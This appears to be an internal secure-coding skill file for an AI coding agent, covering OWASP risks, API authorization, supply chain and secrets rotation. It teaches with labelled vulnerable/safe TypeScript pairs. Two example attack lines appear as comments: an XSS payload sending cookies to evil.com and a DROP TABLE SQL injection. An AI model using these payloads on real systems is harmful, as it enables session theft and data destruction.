---
name: security-by-design
cluster: security-compliance
description: "Security as a design property, not an added layer. OWASP Top 10, supply chain security, secrets management, zero trust. Use when writing endpoints, handling user input, managing dependencies, or configuring infrastructure."
---

# Security by Design

> **Version**: 1.4.0 | **Last updated**: 2026-02-14

## Purpose

Security is a design property, not an added layer. Covers OWASP, supply chain security, dependency management, secrets management, and zero trust approach.

---

## OWASP Top 10 — Operational Rules

**Injection (SQL, NoSQL, OS command)**: never concatenate user input in queries. Use parameterized queries (Drizzle/Prisma do this natively), validate every input with Zod at API entry.

**Broken Authentication**: robust session management (see `authn-authz/SKILL.md`). Firebase ID tokens: 1hr (not configurable), use `checkRevoked` for sensitive ops. Custom auth: 15min access, 7d refresh. Rate limiting on login endpoints. No passwords in logs.

**Sensitive Data Exposure**: TLS everywhere (including service-to-service). Encryption at rest for sensitive data. Never credentials, tokens, or PII in URLs, logs, or unnecessary response bodies.

**Broken Access Control**: authorization at every level (API gateway, service, database query). Never trust the client for authorization decisions. Every endpoint verifies the user/service has permission for the specific resource.

**Security Misconfiguration**: mandatory HTTP security headers (Content-Security-Policy, X-Content-Type-Options, X-Frame-Options, Strict-Transport-Security). Disable headers revealing technology (X-Powered-By). Restrictive CORS (never `*` in production).

**Cross-Site Scripting (XSS)**: output sanitization (React and Vue do this by default with escaping, but beware `dangerouslySetInnerHTML` / `v-html`). Content-Security-Policy to block inline scripts.

### Concrete Vulnerability Examples

**SQL Injection — vulnerable vs safe**:

```typescript
// VULNERABLE — string concatenation
const query = `SELECT * FROM invoices WHERE tenant_id = '${tenantId}' AND status = '${status}'`;
// Attacker sends: status = "'; DROP TABLE invoices; --"

// SAFE — parameterized query (Drizzle ORM)
const invoices = await db
  .select()
  .from(invoicesTable)
  .where(and(eq(invoicesTable.tenantId, tenantId), eq(invoicesTable.status, status)));
```

**XSS — vulnerable vs safe**:

```typescript
// VULNERABLE — rendering user input as HTML
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: text }} />;
  // Attacker sends: text = '<script>document.location="https://evil.com/steal?c="+document.cookie</script>'
}

// SAFE — React auto-escapes by default
function Comment({ text }: { text: string }) {
  return <div>{text}</div>; // Script tags rendered as text, not executed
}

// SAFE — if HTML rendering is needed, sanitize first
import DOMPurify from 'dompurify';
function Comment({ text }: { text: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(text) }} />;
}
```

**Server-Side Request Forgery (SSRF)**: validate and restrict outbound URLs. Never allow user input to directly control server-side HTTP requests. Use allowlists for external service URLs. Block requests to internal networks (169.254.x.x, 10.x.x.x, localhost).

**Insecure Design**: security must be part of design, not bolted on. Threat model critical flows (see STRIDE below). Rate limit business operations (invoice creation, password resets), not just authentication.

**Software and Data Integrity Failures**: verify integrity of CI/CD pipelines, updates, and serialized data. Use signed artifacts, verify checksums, never deserialize untrusted data without validation.

**Security Logging and Monitoring Failures**: log security-relevant events (login attempts, permission denials, data access). Ensure logs are tamper-resistant and retained per compliance requirements (see `compliance-privacy/SKILL.md`).

### CSRF Protection

For cookie-based sessions (not typical with JWT Bearer, but relevant for SSR):

```typescript
// CSRF token middleware — required for state-changing requests with cookies
import { doubleCsrf } from 'csrf-csrf';

const { doubleCsrfProtection } = doubleCsrf({
  getSecret: () => process.env.CSRF_SECRET!,
  cookieName: '__csrf',
  cookieOptions: { httpOnly: true, sameSite: 'strict', secure: true },
});

app.use(doubleCsrfProtection); // Validates token on POST/PUT/PATCH/DELETE
```

For SPAs with JWT Bearer tokens: CSRF protection is implicit (attacker cannot set Authorization header cross-origin). Ensure CORS is restrictive.

### API Security (BOLA/IDOR)

**Broken Object Level Authorization (BOLA)**: the most common API vulnerability. Every endpoint must verify the requesting user has access to the specific resource, not just that they're authenticated.

```typescript
// VULNERABLE — only checks authentication, not authorization
app.get('/invoices/:id', authMiddleware, async (req, res) => {
  const invoice = await db.findInvoice(req.params.id); // Any user can access any invoice
  return res.json(invoice);
});

// SAFE — verifies tenant ownership
app.get('/invoices/:id', authMiddleware, tenantGuard, async (req, res) => {
  const invoice = await db.findInvoice(req.params.id, req.auth.tenantId);
  if (!invoice) return res.status(404).json({ error: 'Not found' });
  return res.json(invoice);
});
```

**Mass Assignment**: never bind request body directly to database model. Use explicit allowlists (Zod schemas) to control which fields are writable.

### Security Headers Middleware

```typescript
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"], // tighten if possible
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", process.env.API_URL],
    },
  },
  hsts: { maxAge: 63072000, includeSubDomains: true, preload: true },
  referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
}));
```

### Threat Modeling (STRIDE)

For high-impact features, run a lightweight STRIDE analysis:

| Threat | Question | Mitigation |
|--------|----------|------------|
| **S**poofing | Can someone impersonate a user/service? | Strong auth, mTLS for services |
| **T**ampering | Can data be modified in transit/at rest? | TLS, integrity checks, signed tokens |
| **R**epudiation | Can someone deny an action? | Audit logs with correlation IDs |
| **I**nformation Disclosure | Can data leak to unauthorized parties? | Encryption, access control, log redaction |
| **D**enial of Service | Can the service be overwhelmed? | Rate limiting, autoscaling, circuit breakers |
| **E**levation of Privilege | Can a user gain unauthorized access? | RBAC, tenant isolation, least privilege |

Document STRIDE analysis in ADR for security-critical features.

---

## Supply Chain Security

### Dependency Management

**Lockfiles**: `package-lock.json` (npm) or `pnpm-lock.yaml` always committed. Use `npm ci` (not `npm install`) for reproducible builds.

**Audit in CI**: `npm audit` blocks build on critical/high vulnerabilities. Swift: `swift package audit` (if available) or Snyk.

**Update policy**: Dependabot or Renovate configured with:
- Automatic PRs for patch updates (auto-merge if tests pass)
- Weekly PRs for minor updates (manual review)
- Manual review for major updates (require ADR if significant)

### Dependency Review — Before Adding

Before any `npm install <package>`, verify:

| Check | Criteria |
|-------|----------|
| Active maintainer | Commits in last 6 months, responsive to issues |
| License | Compatible with project license (MIT, Apache 2.0 preferred) |
| Size | No bloat — check bundlephobia for frontend deps |
| Transitive deps | Fewer is better — large transitive trees increase attack surface |
| Downloads | Established packages preferred (>1000 weekly downloads) |
| Typosquatting risk | Verify exact package name, check for suspicious similar names |
| Recent publish | Very new packages (<30 days) with few downloads are higher risk |

Every `npm install` requires justification (why this dependency, why not a simpler alternative).

### Supply Chain Analysis

**Automated tools**: Snyk or Socket.dev for advanced analysis:
- Typosquatting detection (unusual names, low downloads, recent publish)
- Malicious code injection detection
- Install script analysis
- Network call detection in dependencies

### Build Reproducibility

- Pinned versions in lockfile (never `^` or `~` in production builds)
- Checksums verified by lockfile
- `npm ci` in CI (clean install from lockfile, not `npm install`)

---

## SBOM & Provenance

### SBOM (Software Bill of Materials)

Generate SBOM for **every release artifact** — mandatory, not optional.

**Format**: SPDX or CycloneDX (CycloneDX preferred for its broader tooling support).

**Contents**: direct + transitive dependencies, container base images and their dependencies, build tool versions, license information.

**Storage**: SBOM attached to GitHub Release as artifact, stored alongside container image in Artifact Registry.

**Generation in CI**:
```yaml
# In GitHub Actions release workflow
- name: Generate SBOM
  run: |
    npx @cyclonedx/cyclonedx-npm --output-file sbom.json
    # For containers: syft <image> -o cyclonedx-json > container-sbom.json
```

### Provenance (SLSA-aligned)

Record for every release artifact:
- Source code revision (git SHA)
- Build system identity (GitHub Actions runner)
- Build steps hash (workflow file hash)
- Signer identity (if signing is used)

GitHub Actions attestation:
```yaml
- uses: actions/attest-build-provenance@v1
  with:
    subject-path: 'dist/**'
```

---

## Secrets Management

**Never in code**: no secrets in committed .env files, Dockerfiles, or CI variables visible in logs.

**GCP Secret Manager** as centralized store. Services access secrets via SDK with IAM permission (least privilege: each service accesses only its own secrets).

**Rotation**: secrets have expiration. Rotation must be automated and not require deployment. Pattern: dual-read (service reads both old and new secret during rotation window).

**Local development**: `.env.local` file (in .gitignore) with development values. Never copy production secrets locally.

---

## Zero Trust

No resource is secure just because it's "internal." Every service boundary validates identity and authorization. Cloud Run + IAM for service-to-service auth (caller must have `roles/run.invoker` on the called service). For frontend calls: JWT validated on every request, never session based on IP or network position.

---

## Security Audit Methodology

Structured approach for security-critical code review, adapted from security audit best practices.

### Phase 1 — Initial Orientation

Before deep analysis, perform a minimal mapping:
1. Identify major modules and public entrypoints
2. Note actors (users, services, external systems)
3. Identify sensitive data stores and state variables
4. Map trust boundaries (where untrusted input enters the system)
5. Build a preliminary structure without assuming behavior

### Phase 2 — Granular Analysis

For each security-critical function, analyze:

| Aspect | What to Document |
|--------|-----------------|
| **Purpose** | Why the function exists and its role in the system |
| **Inputs & Assumptions** | Parameters, implicit inputs (auth context, tenant), preconditions |
| **Outputs & Effects** | Return values, state writes, events emitted, external calls |
| **Trust Assumptions** | What the function assumes about its callers and inputs |
| **Invariants** | What must always be true before and after execution |

Apply the **5 Whys** to each assumption: "Why does this function trust the caller?" — trace until you reach a verified check or an unverified assumption (which is a finding).

### Phase 3 — Trust Boundary Mapping

Map every path from untrusted input to sensitive operations:

```
External Request → API Gateway (auth) → Route Handler (authz) → Service (validation) → Database (RLS)
```

At each boundary crossing, verify: authentication check exists, authorization check exists, input validation occurs, output doesn't leak internal details.

### Assumption Tracking

Maintain explicit assumptions and update when contradicted:
- "Earlier I assumed X; after inspecting the code, Y is the actual behavior"
- Never reshape evidence to fit earlier assumptions
- Express uncertainty explicitly: "Unclear; need to inspect X" — not "It probably..."

### Complexity & Fragility Indicators

Flag for deeper review: functions with many trust assumptions, high branching logic, multi-step state dependencies, cross-module state mutations, error handling that differs from the happy path.

---

## Secrets Rotation Implementation

Static secrets are a ticking time bomb. Rotation must be automated and zero-downtime — no service restarts, no manual steps.

### Dual-Read Pattern

During rotation, the service reads both current and previous secret versions. This eliminates the race condition where the secret is updated but some instances still use the old one.

```typescript
interface SecretResolver {
  getCurrent(): Promise<string>;
  getPrevious(): Promise<string | null>;
  verify(secret: string, candidate: string): Promise<boolean>;
}

class RotatingSecretResolver implements SecretResolver {
  constructor(
    private readonly secretName: string,
    private readonly client: SecretManagerServiceClient,
  ) {}

  async getCurrent(): Promise<string> {
    const [version] = await this.client.accessSecretVersion({
      name: `${this.secretName}/versions/latest`,
    });
    return version.payload!.data!.toString();
  }

  async getPrevious(): Promise<string | null> {
    try {
      const [versions] = await this.client.listSecretVersions({ parent: this.secretName });
      const enabled = versions
        .filter((v) => v.state === 'ENABLED')
        .sort((a, b) => Number(b.createTime!.seconds) - Number(a.createTime!.seconds));
      if (enabled.length < 2) return null;
      const [prev] = await this.client.accessSecretVersion({ name: enabled[1].name! });
      return prev.payload!.data!.toString();
    } catch {
      return null;
    }
  }

  async verify(secret: string, candidate: string): Promise<boolean> {
    // Try current secret first, then previous (during rotation window)
    const current = await this.getCurrent();
    if (timingSafeEqual(Buffer.from(secret), Buffer.from(current))) return true;
    const previous = await this.getPrevious();
    if (previous && timingSafeEqual(Buffer.from(secret), Buffer.from(previous))) return true;
    return false;
  }
}
```

### Rotation Sequence

1. **Create new secret version** in Secret Manager
2. **Deploy dual-read** — service reads both current and previous (already the default with `RotatingSecretResolver`)
3. **Grace period** (default: 24h) — allows all instances to pick up the new version
4. **Disable old version** — after grace period, disable the previous secret version
5. **Automation**: Cloud Scheduler triggers rotation on a schedule (e.g., every 90 days)

**Anti-pattern**: rotation that requires service restart. If your service caches the secret at startup and never refreshes, rotation requires redeployment — defeating the purpose of automated rotation.

---

## API Security Beyond BOLA

BOLA is the #1 API vulnerability, but it's not the only one. The OWASP API Security Top 10 includes several more that are commonly missed.

### BFLA (Broken Function Level Authorization)

A user can access admin endpoints by guessing the URL. Authentication is not authorization — checking that a user is logged in does not mean they can access `/admin/users`.

```typescript
// VULNERABLE — auth middleware only checks authentication
app.delete('/api/v1/users/:id', authMiddleware, async (req, res) => {
  await db.deleteUser(req.params.id); // Any authenticated user can delete any user
});

// SAFE — role-based route guard
app.delete('/api/v1/users/:id', authMiddleware, requireRole('admin'), async (req, res) => {
  await db.deleteUser(req.params.id);
});
```

### Excessive Data Exposure

API returns the full database object when the client only needs 3 fields. This leaks internal fields, increases bandwidth, and exposes data that may be sensitive in certain contexts.

```typescript
// VULNERABLE — returns full object
app.get('/api/v1/users/:id', authMiddleware, async (req, res) => {
  const user = await db.findUser(req.params.id);
  return res.json(user); // Includes passwordHash, internalNotes, billingDetails...
});

// SAFE — explicit response shaping with dedicated DTO
const UserPublicSchema = z.object({
  id: z.string(), name: z.string(), email: z.string(), role: z.string(),
});

app.get('/api/v1/users/:id', authMiddleware, async (req, res) => {
  const user = await db.findUser(req.params.id);
  return res.json(UserPublicSchema.parse(user)); // Only whitelisted fields
});
```

### GraphQL-Specific Security

```typescript
import depthLimit from 'graphql-depth-limit';
import { createComplexityLimitRule } from 'graphql-validation-complexity';

const server = new ApolloServer({
  schema,
  introspection: process.env.NODE_ENV !== 'production', // Disable in production
  validationRules: [
    depthLimit(10),                                      // Max query depth
    createComplexityLimitRule(1000, {                     // Max query cost
      scalarCost: 1,
      objectCost: 2,
      listFactor: 10,
    }),
  ],
});
```

Field-level authorization: use GraphQL directives or resolver-level checks to enforce access control per field, not just per type.

**Anti-pattern**: relying on client-side field selection as a security boundary. A client can always request all fields — the server must enforce what is returned.

---

## Secure Defaults Pre-flight Checklist

A single misconfiguration can void all other security measures. This checklist is the gate before a service is considered production-ready.

### Pre-flight Checks

- [ ] **TLS enforced** on all endpoints (no HTTP fallback, HSTS enabled)
- [ ] **Security headers** applied (CSP, HSTS, X-Content-Type-Options, X-Frame-Options)
- [ ] **CORS restricted** to known origins (never `*` in production)
- [ ] **Debug/admin endpoints** disabled or protected in production (no `/debug`, `/metrics` without auth)
- [ ] **Secrets loaded from Secret Manager**, not environment variables or config files
- [ ] **Dependency audit passing** (no critical/high vulnerabilities in `npm audit`)
- [ ] **SBOM generated** for release artifact
- [ ] **Authentication required** on all non-public endpoints
- [ ] **Rate limiting configured** on all public endpoints
- [ ] **Error responses** do not leak internal details (no stack traces, no dependency names)
- [ ] **Logging** does not contain PII, credentials, or tokens
- [ ] **Input validation** on all endpoints (Zod schemas)

Cross-reference: `insecure-defaults/SKILL.md` for automated detection of fail-open defaults, `sharp-edges/SKILL.md` for footgun design patterns.

---

## Security Policy Injection

Security configurations (CORS origins, CSP directives, rate limits) hardcoded in source code are a maintenance and deployment nightmare. They must be injectable as configuration, varying per environment.

### Pattern

```typescript
import { z } from 'zod';

const SecurityPolicySchema = z.object({
  cors: z.object({
    allowedOrigins: z.array(z.string()),
    allowedMethods: z.array(z.string()).default(['GET', 'POST', 'PUT', 'PATCH', 'DELETE']),
    maxAge: z.number().default(86400),
  }),
  csp: z.object({
    defaultSrc: z.array(z.string()),
    scriptSrc: z.array(z.string()),
    styleSrc: z.array(z.string()),
    connectSrc: z.array(z.string()),
  }),
  rateLimit: z.object({
    windowMs: z.number().default(60_000),
    maxRequests: z.number().default(100),
  }),
});

type SecurityPolicy = z.infer<typeof SecurityPolicySchema>;

function loadSecurityPolicy(): SecurityPolicy {
  const raw = JSON.parse(process.env.SECURITY_POLICY ?? '{}');
  return SecurityPolicySchema.parse(raw);
}
```

### Per-Environment Configuration

| Environment | CORS Origins | CSP | Rate Limit |
|-------------|-------------|-----|------------|
| **Development** | `localhost:*` | Permissive (inline scripts allowed) | Disabled |
| **Staging** | Production-like origins | Production-identical | Production-identical |
| **Production** | Exact production domains only | Strict (no inline) | Enforced |

### Runtime Reloadable

For policy changes without redeployment, implement a config watcher or admin endpoint:

```typescript
let currentPolicy = loadSecurityPolicy();

// Reload on config change (e.g., Secret Manager version update)
setInterval(async () => {
  try {
    const fresh = loadSecurityPolicy();
    currentPolicy = fresh;
    logger.info('Security policy reloaded');
  } catch (error) {
    logger.error({ err: error }, 'Failed to reload security policy — keeping current');
  }
}, 5 * 60 * 1000); // Check every 5 minutes
```

**Anti-pattern**: security policies that differ between staging and production. If staging has permissive CORS and production has strict CORS, you'll discover CORS bugs in production — not staging. Staging must be production-identical for security configuration.

---

## Anti-Patterns

- **Security bolted on** — adding security after development instead of designing it in; retrofit security is incomplete and expensive
- **Trust the client** — relying on client-side validation for security decisions; all authorization must be server-side
- **Secrets in code** — hardcoded API keys, tokens, or passwords in source; use Secret Manager with IAM-based access
- **Overpermissive CORS** — `Access-Control-Allow-Origin: *` in production; restrict to known origins only
- **Single-layer authorization** — checking permissions only at the API gateway; enforce at gateway, service, and database (RLS) layers
- **Ignoring supply chain** — `npm install` without audit, review, or lockfile verification; every dependency is an attack surface

---

## For Claude Code

When generating code: Zod input validation on every endpoint, parameterized queries always, HTTP security headers in global middleware, no hardcoded secrets (use env vars referencing Secret Manager). Include `npm audit` in CI. Never `dangerouslySetInnerHTML` or `v-html` without explicit sanitization. When adding dependencies, document justification. Generate SBOM step in release CI workflow. Implement secrets rotation with dual-read pattern — never cache secrets at startup without refresh. Apply BFLA guards (role-based route protection) on all admin/privileged endpoints. Shape API responses with explicit DTOs — never return raw database objects. For GraphQL, disable introspection in production and enforce depth/complexity limits. Run the secure defaults pre-flight checklist before marking a service production-ready. Load security policies (CORS, CSP, rate limits) from injectable configuration, not hardcoded values.

---

*Internal references*: `authn-authz/SKILL.md`, `compliance-privacy/SKILL.md`, `security-testing/SKILL.md`, `containerization/SKILL.md`
